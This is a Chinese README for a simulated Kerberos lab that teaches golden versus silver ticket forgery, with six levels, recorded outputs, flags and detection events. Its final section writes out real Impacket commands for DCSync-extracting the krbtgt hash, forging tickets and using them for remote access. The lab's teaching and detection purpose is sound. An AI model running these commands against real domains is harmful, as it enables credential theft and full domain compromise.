# Kerberos 黄金 / 白银票据靶场

一个只依赖 Python 标准库的 Kerberos 信任关系靶场。六道关卡，每关对应「黄金票据 vs 白银票据」的一条区别，且都能用命令打出可复核的证据（日志、票据结构、拒绝原因、flag）。

## 先说清楚：这是仿真，不是 Windows AD

Apple Silicon Mac 跑不了 Windows Server AD DC；Samba AD DC 的 PAC 生成与校验路径又和 Windows 不一致，拿它练「白银票据为什么被完整 PAC 签名挡住」会得出错误结论。所以这里做**协议语义级仿真**：

- 真实 TGT 用 `krbtgt` 密钥加密、真实 TGS 用服务账户密钥加密；这里改用「可读 JSON + 对应密钥的 HMAC-SHA256 封印」。封印不是加密，但保留了决定性的性质：**没有那把密钥，就造不出会被信任的票据**。
- 好处是 `klist` 能直接看到 PAC、SID、组、SPN、生命周期，不必去解二进制票据。
- 密钥关系、PAC 双签名、krbtgt 双密钥历史、KDC 日志语义、SPN 绑定，全部按真实逻辑实现。
- **不能练的**：真实 AS/TGS/AP 报文、RC4/AES 加密类型、mimikatz 注入、`ntds.dit` 提取。文末给出迁移到真实 AD 的命令。

靶场刻意把「谁能造票」放在客户端：`src/krb.py` 被服务端和攻击脚本共同导入，`poc/lab.py forge` 全程不发 HTTP，只在本地用泄露的密钥封印票据。服务端从不帮攻击者造假，只拿自己手里的密钥校验 —— 和真实 KDC 一样。

## 快速开始

```sh
cd /Users/liyuhang/代码库/靶场/kerberos
sh setup.sh                      # 仅绑定 127.0.0.1:8907
python3 poc/lab.py help          # 全部命令
python3 poc/solve.py             # 一键跑完六关并断言
```

面板 `http://127.0.0.1:8907` 左栏是域控安全日志（4768 / 4769），右栏是成员服务器本地日志（4624 / 4625），每 2 秒刷新。**打白银票据时盯左栏，它不会新增任何一行** —— 这是整个靶场最直观的一幕。

停止：`docker compose down`。回到初始状态：`python3 poc/lab.py restart`。

## 域信息

| 项 | 值 |
| --- | --- |
| 域 | `LAB.LOCAL`，SID `S-1-5-21-1111111111-2222222222-3333333333` |
| 已知凭据 | `alice / alice123`（普通域用户，RID 1105，组 513） |
| 未知凭据 | `Administrator`（RID 500，组 512 = Domain Admins） |
| 服务 | `http/portal.lab.local`（普通用户）、`cifs/files.lab.local`、`http/files.lab.local`、`cifs/dc.lab.local`（后三个仅域管） |
| 端口 | `127.0.0.1:8907` |

泄露端点模拟「攻击者已具备的前提」，不是漏洞本身：`/api/leak/krbtgt` ≈ DCSync / `ntds.dit`，`/api/leak/service?spn=` ≈ 目标机本地提权读 SAM 里的机器账户哈希。

## 六关：命令、原理与实测结果

本节所有「实测结果」代码块都是 `python3 poc/solve.py` 在 **2026-11-17 17:34** 的一次真实运行输出（容器 `sec-lab-kerberos-kdc` 当时已连续运行 4 天），原样摘录，没有改写结论。票据指纹与时间戳每次运行都会变；`ok`、`reason`、flag、日志条数不变。

自己复核：先 `python3 poc/lab.py restart`，再 `python3 poc/solve.py`，最后 `python3 poc/lab.py logs` 对照本文。

### L1 正常三段流程

**命令**

```sh
python3 poc/lab.py login alice alice123
python3 poc/lab.py ask http/portal.lab.local
python3 poc/lab.py use http/portal.lab.local
python3 poc/lab.py logs
```

**原理**

- ① AS-REQ / AS-REP：客户端用口令向 KDC 的 AS 证明身份，KDC 用 `krbtgt` 密钥封印 TGT，写安全日志 4768。客户端自己解不开 TGT，只能原样交回去。
- ② TGS-REQ / TGS-REP：带 TGT + 目标 SPN 找 TGS，KDC 校验 TGT 后用**目标服务账户密钥**封印 TGS，写 4769。PAC 由 KDC 签名，里面是用户 SID 和组 SID。
- ③ AP-REQ：客户端把 TGS 直接交给服务。服务端用自己的密钥解开、读 PAC 决定放行，写本地 4624；**默认不会回头问 KDC「这票真是你发的吗」**。
- 这三步是后面所有异常的基线：正常的 4768、4769、4624 能一一对应上。

**实测结果**

```text
[L1] 正常三段流程：AS -> TGS -> AP
  AS-REQ alice                               ok=True  reason=-
  TGS-REQ 内网门户                               ok=True  reason=-
  AP-REQ 内网门户（应成功）                           ok=True  reason=-   ->  L1 FLAG{kerberos_l1_as_tgs_ap}

[对照] 普通域用户正常申请域控 C$：PAC 里没有 512，应被拒
  TGS-REQ 域控 C$                              ok=True  reason=-
  AP-REQ 域控 C$（应拒绝）                          ok=False reason=access_denied
```

**证据怎么读**

- DC 日志出现 `4768 alice` → `4769 http/portal.lab.local`，目标机出现 `4624 alice`，三方对得上。
- 对照实验的 `access_denied`：正常路径下 PAC 里只有 513（Domain Users），拿不到要求 512 的资源。**攻击的目标就是改这个 PAC** —— 后面五关都围绕它。

### L2 黄金票据

**命令**

```sh
python3 poc/lab.py leak krbtgt
python3 poc/lab.py forge golden
python3 poc/lab.py klist
python3 poc/lab.py ask cifs/dc.lab.local
python3 poc/lab.py use cifs/dc.lab.local
python3 poc/lab.py logs
```

**原理**

- 前提：DCSync / `ntds.dit` 拿到 `krbtgt` 密钥 —— 它是全域 TGT 的签发密钥，等于域里最高价值的秘密。
- 伪造发生在**第 ① 步的产物**：离线造一张 TGT，用户名、组 SID、生命周期随便填（这里 `Administrator` + 512 + 10 年），用 krbtgt 密钥封印。
- KDC 分辨不出来：它校验 TGT 用的就是同一把 krbtgt 密钥，于是照常签发 TGS，PAC 由 KDC 重新签名。
- 因为没走过 AS，DC 上**没有 4768，却有 4769**；TGT 生命周期 10 年也远超域策略 10 小时。这是黄金票据最经典的两个检测点。
- 范围：能换域内任意 SPN 的 TGS，等于全域通吃；伪造用户甚至可以不存在。

**实测结果**

```text
=== 离线伪造黄金票据（TGT）===
  密钥来源：krbtgt（DCSync）  未向 KDC 发送任何请求
  身份：Administrator  组：513,512  有效期：315360000 秒（域策略为 36000 秒）
  已写入 .cache/tgt，接下来：ask <spn> 换真 TGS，再 use <spn>
  票据指纹：d12d9b81c9f84520
  TGS-REQ（KDC 认了伪造 TGT）                      ok=True  reason=-
  AP-REQ 域控 C$（应成功）                          ok=True  reason=-   ->  L2 FLAG{kerberos_l2_golden_tgt}
```

DC 日志对应行：

```text
  17:34:35  4769  Administrator cifs/dc.lab.local        success  KDC 未签发过此 TGT（4768 缺失）；TGT lifetime=315360000s，超出 10 小时策略
```

**证据怎么读**

- `315360000` 秒 = 10 年，`36000` 秒 = 10 小时策略，差 8760 倍。
- `4768 缺失` 是检测判据；`klist` 里 `groups=['513', '512']` 说明 PAC 被塞进了域管组。
- `forge golden` 全程不发 HTTP，是**离线伪造**；KDC 只是被动相信了合法密钥签出来的票。

### L3 白银票据

**命令**

```sh
python3 poc/lab.py leak service cifs/files.lab.local
python3 poc/lab.py forge silver --spn cifs/files.lab.local
python3 poc/lab.py use cifs/files.lab.local
python3 poc/lab.py logs
```

**原理**

- 前提：从目标机本地 SAM 拿到该机器 / 服务账户的密钥（门槛比 DCSync 低得多，一台成员机本地管理员就够）。
- 伪造发生在**第 ③ 步的产物**：直接造 TGS，用服务账户密钥封印，PAC 的服务签名也能伪造。
- 服务端用自己的密钥能解开票据、PAC 服务签名也对得上，就直接放行 —— **完全跳过 KDC**，因此 DC 上 4768 / 4769 一条都不会多。
- 检测只能靠目标机本地 4624（配合 4627 看组），必须把成员服务器日志也转发出来。
- 代价：只对签发时的那个 SPN 有效（L4 验证）。

**实测结果**

```text
=== 离线伪造白银票据（TGS）===
  密钥来源：cifs/files.lab.local 的账户密钥（本地 SAM）  未向 KDC 发送任何请求
  身份：Administrator  组：513,512  SPN：cifs/files.lab.local
  PAC kdc_sig 是伪造的 —— 只有开启完整 PAC 校验时才会被查出来
  已写入 .cache/tgs，接下来直接：use cifs/files.lab.local（注意没有 ask 这一步）
  票据指纹：fbb7e84bc61d57c7
  AP-REQ 文件服务（应成功）                           ok=True  reason=-   ->  L3 FLAG{kerberos_l3_silver_tgs}
  域控日志条数：4 -> 4（白银票据未产生任何 DC 事件）
```

**证据怎么读**

- 命令序列里**没有 `ask`**，这是白银和黄金最直观的操作差别。
- `4 -> 4` 是 `solve.py` 的硬断言：DC 日志条数在白银攻击前后完全不变；同一时刻目标机多了 `4624 Administrator cifs/files.lab.local success`。
- 面板上表现为：右栏新增一行，左栏纹丝不动。

### L4 范围限制

**命令**

```sh
python3 poc/lab.py use http/files.lab.local
```

**原理**

- TGS 里写着 `sname` / SPN，服务端解密后会核对它和本次请求的服务是否一致。
- 靶场让 `cifs/files.lab.local` 与 `http/files.lab.local` **共用同一把机器账户密钥**：真实 AD 里同一主机的多个 HOST SPN 注册在同一个计算机账户下。因此这里能解开票据，但 SPN 字段不符 → 拒绝。
- 若换成另一台机器的服务（密钥不同），连解密都过不了，会先返回 `bad_seal`。第一版靶场正好踩了这个坑（见「认知纠错」第 8 条）。
- 结论：白银票据是「一个 SPN 的后门」，黄金票据动的是整条链的起点，能换任意 SPN 的 TGS。

**实测结果**

```text
[L4] 范围限制：把 cifs 白银票据投给 http 服务
  AP-REQ Web 管理（应拒绝）                         ok=False reason=spn_mismatch        ->  L4 FLAG{kerberos_l4_spn_scope}
```

目标机日志：

```text
  17:34:35  4625  Administrator http/files.lab.local     fail  spn_mismatch
```

**证据怎么读**

- 密钥是对的、票据解得开，仍然被拒 —— 说明限制来自票据内容本身，不是密码学失败。

### L5 完整 PAC 签名强制

**命令**

```sh
python3 poc/lab.py pac on
python3 poc/lab.py forge silver --spn cifs/files.lab.local
python3 poc/lab.py use cifs/files.lab.local     # bad_kdc_signature
python3 poc/lab.py forge golden
python3 poc/lab.py ask cifs/dc.lab.local
python3 poc/lab.py use cifs/dc.lab.local       # 仍然成功
```

**原理**

- PAC 有两个签名：`svc_sig` 用服务密钥签、`kdc_sig` 用 krbtgt 密钥签。
- 白银持有者只有服务密钥：能伪造 `svc_sig`，**签不出合法 `kdc_sig`**（靶场里直接填 64 个 0）。
- 服务端默认只校验 `svc_sig`；开启完整 PAC 签名校验（KB5020805 / CVE-2022-37967，2023-10 全面强制）后还要验 `kdc_sig`，伪造的白银票就露馅。真实域对应 DC System 日志 KDC 事件 43（Full PAC Signature Failed）/ 44（Missing）。
- 黄金票据不受影响：它走 TGS-REQ，KDC 换票时用 krbtgt 密钥**重新签了 PAC**，签名天然合法。这就是「同一防御对两种票据结果不同」的根本原因。

**实测结果**

```text
[L5] 开启完整 PAC 签名校验（对应 KB5020805 强制模式）
  pac on                                     ok=True  reason=-
  白银票据（KDC 签名伪造，应被拒）                         ok=False reason=bad_kdc_signature
  TGS-REQ（KDC 重新签 PAC）                       ok=True  reason=-
  黄金票据（PAC 由 KDC 重签，应成功）                     ok=True  reason=-   ->  L5 FLAG{kerberos_l5_pac_signature}
```

目标机日志：

```text
  17:34:35  4625  Administrator cifs/files.lab.local     fail  bad_kdc_signature
  17:34:35  4624  Administrator cifs/dc.lab.local        success  服务端用自己的密钥解开了 TGS 并信任 PAC
```

通关后 `python3 poc/lab.py klist` 快照（缓存里是黄金 TGT + KDC 重签的 TGS）：

```text
=== 票据缓存（klist）===
  tgt  指纹=d12d9b81c9f84520
    type=TGT  user=Administrator  spn=-  lifetime=315360000s
    groups=['513', '512']
    PAC kdc_sig=a649d620b821...  svc_sig=a649d620b821...
  tgs  指纹=aefbacd6973f6139
    type=TGS  user=Administrator  spn=cifs/dc.lab.local  lifetime=36000s
    groups=['513', '512']
    PAC kdc_sig=6d2be46ab819...  svc_sig=8d729bf271e4...
```

**证据怎么读**

- TGT 是离线自签的，两个签名都用 krbtgt 密钥，所以**相同**；TGS 由 KDC 用 krbtgt + 服务密钥分别签，所以**不同**。一眼就能看出 PAC 是谁签的。
- 同一个 `pac on` 开关下，白银 `bad_kdc_signature`、黄金 `ok=True`，L5 的结论就在这两行。

### L6 krbtgt 轮换

**命令**

```sh
python3 poc/lab.py reset
python3 poc/lab.py ask cifs/dc.lab.local       # 旧黄金 TGT 仍被接受
python3 poc/lab.py reset
python3 poc/lab.py ask cifs/dc.lab.local       # tgt_invalid
```

**原理**

- TGT 是 krbtgt 密钥封印的，和任何用户口令都无关；改 Administrator 密码杀不掉黄金票据。
- KDC 保留两份 krbtgt 密码历史（当前 + 上一个），校验时两把密钥都接受 —— 这是为了让轮换期间已签发的票据平滑过渡。
- 因此**重置一次无效**（旧密钥还在历史里），第二次才把旧密钥挤出，伪造 TGT 才会校验失败。
- 真实处置顺序：先清掉攻击者的 DC 访问 / DCSync 权限和持久化 → 重置 → 等超过最大票据寿命（默认 10 小时）并确认所有可写 DC 复制完成 → 再重置第二次。

**实测结果**

```text
[L6] krbtgt 轮换：一次不够，两次才让旧黄金票据失效
  第一次重置 krbtgt                               ok=True  reason=-
  旧黄金 TGT 仍被接受（历史密钥还在）                       ok=True  reason=-
  第二次重置 krbtgt                               ok=True  reason=-
  旧黄金 TGT 应校验失败                              ok=False reason=tgt_invalid         ->  L6 FLAG{kerberos_l6_krbtgt_rotation}
```

DC 日志对应行：

```text
  17:34:35  4738  krbtgt       -                        success  krbtgt 密码已重置 1 次；KDC 当前接受 2 把历史密钥
  17:34:35  4769  Administrator cifs/dc.lab.local        success  KDC 未签发过此 TGT（4768 缺失）；TGT lifetime=315360000s，超出 10 小时策略
  17:34:35  4738  krbtgt       -                        success  krbtgt 密码已重置 2 次；KDC 当前接受 2 把历史密钥
  17:34:35  4769  Administrator cifs/dc.lab.local        fail  TGT 封印校验失败
```

**证据怎么读**

- 两次 `4738` 之间夹着一次成功的 `4769`，这就是「一次不够」的实证；第二次之后才出现 `TGT 封印校验失败`。
- `leak krbtgt` 取的是**当前**密钥，L6 必须复用旧票据，别重新泄露，否则测不出轮换效果。

### 全局结果：6 / 6

```text
通关进度：6 / 6
  L1  FLAG{kerberos_l1_as_tgs_ap}  <- 正常三段流程：DC 有 4768 + 4769，目标机有 4624，三方日志能对上
  L2  FLAG{kerberos_l2_golden_tgt}  <- 黄金票据：DC 出现 4769 但查不到对应 4768，PAC 里塞进域管组 512
  L3  FLAG{kerberos_l3_silver_tgs}  <- 白银票据：目标机 4624 成功，DC 却没有新增任何 4768/4769
  L4  FLAG{kerberos_l4_spn_scope}  <- 白银票据只能用于签发的那个 SPN，改投其他服务被服务端拒绝
  L5  FLAG{kerberos_l5_pac_signature}  <- 完整 PAC 签名强制后：白银票据 KDC 签名验不过被拒，黄金票据经 KDC 重签仍然有效
  L6  FLAG{kerberos_l6_krbtgt_rotation}  <- 两次重置 krbtgt 后，旧密钥被挤出历史，10 年期伪造 TGT 校验失败

全部断言通过。面板：http://127.0.0.1:8907
```

完整日志对照（`python3 poc/lab.py logs`，脚本在同一秒内跑完，靠条数与顺序区分，别看时间戳）：

```text
=== 域控 DC 安全日志 ===
  17:34:35  4768  alice        -                        success  AS 签发 TGT（10 小时）
  17:34:35  4769  alice        http/portal.lab.local    success  TGS-REQ 已处理
  17:34:35  4769  alice        cifs/dc.lab.local        success  TGS-REQ 已处理
  17:34:35  4769  Administrator cifs/dc.lab.local        success  KDC 未签发过此 TGT（4768 缺失）；TGT lifetime=315360000s，超出 10 小时策略
  17:34:35  4769  Administrator cifs/dc.lab.local        success  KDC 未签发过此 TGT（4768 缺失）；TGT lifetime=315360000s，超出 10 小时策略
  17:34:35  4738  krbtgt       -                        success  krbtgt 密码已重置 1 次；KDC 当前接受 2 把历史密钥
  17:34:35  4769  Administrator cifs/dc.lab.local        success  KDC 未签发过此 TGT（4768 缺失）；TGT lifetime=315360000s，超出 10 小时策略
  17:34:35  4738  krbtgt       -                        success  krbtgt 密码已重置 2 次；KDC 当前接受 2 把历史密钥
  17:34:35  4769  Administrator cifs/dc.lab.local        fail  TGT 封印校验失败

=== 目标服务器本地日志 ===
  17:34:35  4624  alice        http/portal.lab.local    success  服务端用自己的密钥解开了 TGS 并信任 PAC
  17:34:35  4625  alice        cifs/dc.lab.local        fail  access_denied
  17:34:35  4624  Administrator cifs/dc.lab.local        success  服务端用自己的密钥解开了 TGS 并信任 PAC
  17:34:35  4624  Administrator cifs/files.lab.local     success  服务端用自己的密钥解开了 TGS 并信任 PAC
  17:34:35  4625  Administrator http/files.lab.local     fail  spn_mismatch
  17:34:35  4625  Administrator cifs/files.lab.local     fail  bad_kdc_signature
  17:34:35  4624  Administrator cifs/dc.lab.local        success  服务端用自己的密钥解开了 TGS 并信任 PAC

  krbtgt 重置 2 次 / PAC 严格=True
```

从这两栏直接读出的区别：

- 黄金：`4769` 有，`4768` 无。
- 白银：DC 栏整整一段没有新增，成员机栏却多了 `4624`。
- L5 之后成员机栏同时出现 `bad_kdc_signature` 和黄金的 `4624 success`。

## 实现要点

- `src/krb.py`：域常量、票据封印 / 解封、PAC 双签名、票据指纹。服务端与攻击脚本共用，保证伪造发生在客户端。
- `src/server.py`：一个进程扮演 AS（4768）、TGS（4769）、成员服务器（4624/4625）。用「票据指纹不在已签发集合里」判定 TGS 是否离线伪造，不依赖客户端自报。
- `poc/lab.py`：CLI 客户端，`forge` 完全离线；票据缓存 `.cache/` 对应 `KRB5CCNAME` / `*.kirbi`。
- `poc/solve.py`：端到端断言脚本，任何一步的 `ok` / `reason` 不符就非零退出。
- 关卡判定全部基于服务端观察到的客观事件，flag 只在证据成立时发放。

## 认知纠错

几个刚开始最容易搞反的点，逐条记下来：

1. **「白银票据比黄金票据更强」** —— 错。黄金拿的是域里最顶级的密钥，能冒充任意用户、访问任意服务、写任意组；白银只有一个服务的密钥，只对一个 SPN 有效。白银的优势只有**隐蔽**，不是权限。
2. **「白银票据也要过域控」** —— 错。TGS 是直接递给目标服务的 AP-REQ，KDC 全程不参与，所以 DC 侧 4768/4769 全空。检测必须把成员服务器日志也收上来。
3. **「mimikatz 里黄金和白银是两个命令」** —— 错。两者都用 `kerberos::golden`，白银只是多了 `/target: /service: /rc4:`，没有 `/krbtgt:`。Impacket 里则都是 `ticketer.py`，白银多一个 `-spn`。
4. **「改用户密码 / 重置一次 krbtgt 就能杀掉黄金票据」** —— 错。TGT 是 krbtgt 签的，和任何用户密码都无关；且 KDC 保留两份密钥历史，必须重置两次。
5. **「白银票据今天还能随便用」** —— 过时了。2023-10 之后完整 PAC 签名校验强制，缺合法 KDC 签名的伪造 TGS 会被拒。L5 就是专门用来纠正这条的。
6. **「黄金票据会被 PAC 签名挡住」** —— 错。黄金票据走 TGS-REQ，KDC 会重新签 PAC；持有 krbtgt 密钥的人本来就能签出合法签名。
7. **「票据里的权限是客户端自己填的，所以随便改」** —— 只改明文没用。真实票据整体加密、PAC 带签名；这里改成 HMAC 封印，同样是「有密钥才改得动」。靶场里 `forge` 必须带上泄露的密钥才能成功。
8. **「每个 SPN 各有一把密钥」** —— 错。同一台机器上的 `cifs/host`、`http/host`、`host/host` 等 SPN 注册在同一个计算机账户下，共用 `HOST$` 的密钥。所以拿一台机器的账户哈希，理论上能伪造这台机器上任意 SPN 的白银票据，但每张票据里的 SPN 字段仍必须和访问目标一致。第一版靶场把每个 SPN 的密钥拆开了，L4 直接返回 `bad_seal`，正好把这个误解暴露出来并修掉了。

## 迁移到真实 AD

想打真协议，需要 Windows 域：Apple Silicon 上用 UTM 跑 Windows Server 评估版做 DC + 一台域成员机，或起 GOAD / DetectionLab。流程与靶场一一对应：

```sh
# 前提：已有域管权限或 DCSync 权限，环境为自建/授权靶场
secretsdump.py lab.local/admin:'P@ss'@dc.lab.local -just-dc-user krbtgt   # ≈ leak krbtgt
lookupsid.py lab.local/alice:'alice123'@dc.lab.local 0                    # 取域 SID

# 黄金票据：造 TGT，再让 KDC 换 TGS（对应 L2 的 forge + ask）
ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain lab.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass lab.local/Administrator@dc.lab.local

# 白银票据：造 TGS，直接访问（对应 L3，没有 ask）
ticketer.py -nthash <TARGET$_HASH> -domain-sid S-1-5-21-... -domain lab.local \
            -spn cifs/files.lab.local Administrator
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass lab.local/Administrator@files.lab.local

# 对照事件查看器：4768 / 4769 / 4624 / 4627，以及 DC System 日志 KDC 事件 43 / 44
```

本机已确认：`/usr/bin/klist` 支持 `-c` 和 `--json`；`impacket` 尚未安装，需要时用
`/Users/liyuhang/.workbuddy/binaries/python/envs/default/bin/pip install impacket`。

## 踩坑

- 容器挂 `./src:/app:ro`，改完 `server.py` 要 `docker compose restart` 才生效；改 `poc/` 不需要重启。
- `forge` 依赖 `.cache/keys.json`，没先 `leak` 会明确拒绝，不会偷偷从服务端取密钥。
- `.cache/tgt` 与 `.cache/tgs` 是单份缓存，`forge golden` 会覆盖 `login` 拿到的正常 TGT；想重来就 `restart`。
- `leak krbtgt` 拿到的是**当前**密钥；轮换之后要用旧票据做 L6，不要重新 leak。
- `solve.py` 跑得快，日志时间戳可能全挤在同一秒，别拿时间戳做关联，看条数和顺序。
- 端口只绑 `127.0.0.1`，别把 `compose.yml` 里的端口映射改成 `0.0.0.0`。

## 文件清单

```
kerberos/
├── compose.yml          独立网络与端口映射
├── setup.sh             一键启动 + 就绪检查
├── README.md            本文（六关命令 / 原理 / 实测结果）
├── src/krb.py           共享密码学层（票据封印 / PAC 双签名）
├── src/server.py        KDC + 成员服务器 + JSON API
├── src/index.html       实时日志与关卡面板
├── poc/lab.py           攻击机 CLI（零第三方依赖）
├── poc/solve.py         一键通关断言
└── flags/l{1..6}.flag   六关 flag
```
